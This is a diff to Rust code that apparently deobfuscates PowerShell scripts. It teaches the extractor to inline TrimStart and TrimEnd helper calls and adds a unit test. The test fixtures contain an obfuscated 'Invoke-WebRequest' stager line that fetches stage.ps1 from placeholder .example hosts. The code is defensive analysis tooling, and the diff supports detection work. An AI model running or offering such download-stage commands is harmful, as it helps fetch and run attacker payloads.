@@ -970,7 +970,7 @@ static PS_LITERAL_DOT_REPLACE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 #[allow(clippy::expect_used)]
 static PS_LITERAL_TRIM_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)(?:\breturn\s+)?\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Trim\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
+        r#"(?is)(?:\breturn\s+)?\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*(Trim(?:Start|End)?)\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
     )
     .expect("ps literal trim extractor body regex")
 });
@@ -3327,7 +3327,13 @@ fn expand_literal_trim_extractor_calls(text: &str) -> String {
         let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
             continue;
         };
-        let Some(chars_var) = caps.get(2).map(|m| m.as_str()) else {
+        let Some(kind) = caps
+            .get(2)
+            .and_then(|m| PsTrimKind::from_method(m.as_str()))
+        else {
+            continue;
+        };
+        let Some(chars_var) = caps.get(3).map(|m| m.as_str()) else {
             continue;
         };
 
@@ -3339,7 +3345,7 @@ fn expand_literal_trim_extractor_calls(text: &str) -> String {
             continue;
         };
 
-        out = inline_ps_literal_trim_calls(&out, &name, value_idx, chars_idx);
+        out = inline_ps_literal_trim_calls(&out, &name, value_idx, chars_idx, kind);
     }
     out
 }
@@ -3662,6 +3668,7 @@ fn inline_ps_literal_trim_calls(
     name: &str,
     value_idx: usize,
     chars_idx: usize,
+    kind: PsTrimKind,
 ) -> String {
     let lower = text.to_ascii_lowercase();
     let needle_name = name.to_ascii_lowercase();
@@ -3724,7 +3731,7 @@ fn inline_ps_literal_trim_calls(
             search_from = call_end;
             continue;
         }
-        let trimmed = value.trim_matches(|ch| chars.contains(ch));
+        let trimmed = kind.apply(value, chars);
         if trimmed.len() > 8192 {
             search_from = call_end;
             continue;
@@ -3740,6 +3747,35 @@ fn inline_ps_literal_trim_calls(
         out.replace_range(start..end, &replacement);
     }
     out
+}
+
+#[derive(Clone, Copy)]
+enum PsTrimKind {
+    Both,
+    Start,
+    End,
+}
+
+impl PsTrimKind {
+    fn from_method(method: &str) -> Option<Self> {
+        if method.eq_ignore_ascii_case("trim") {
+            Some(Self::Both)
+        } else if method.eq_ignore_ascii_case("trimstart") {
+            Some(Self::Start)
+        } else if method.eq_ignore_ascii_case("trimend") {
+            Some(Self::End)
+        } else {
+            None
+        }
+    }
+
+    fn apply<'a>(self, value: &'a str, chars: &str) -> &'a str {
+        match self {
+            Self::Both => value.trim_matches(|ch| chars.contains(ch)),
+            Self::Start => value.trim_start_matches(|ch| chars.contains(ch)),
+            Self::End => value.trim_end_matches(|ch| chars.contains(ch)),
+        }
+    }
 }
 
 fn inline_ps_literal_split_index_calls(
@@ -6477,6 +6513,21 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1~~~'
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1'"),
             "trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_trim_end_extractor_call_is_rewritten() {
+        let text = r#"function Clean($value,$chars) {
+  return $value.TrimEnd($chars)
+}
+Clean 'Invoke-WebRequest -Uri https://ps-trimend-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains("'Invoke-WebRequest -Uri https://ps-trimend-extractor.example/stage.ps1'"),
+            "trim-end extractor call was not rewritten:\n{out}"
         );
     }
 
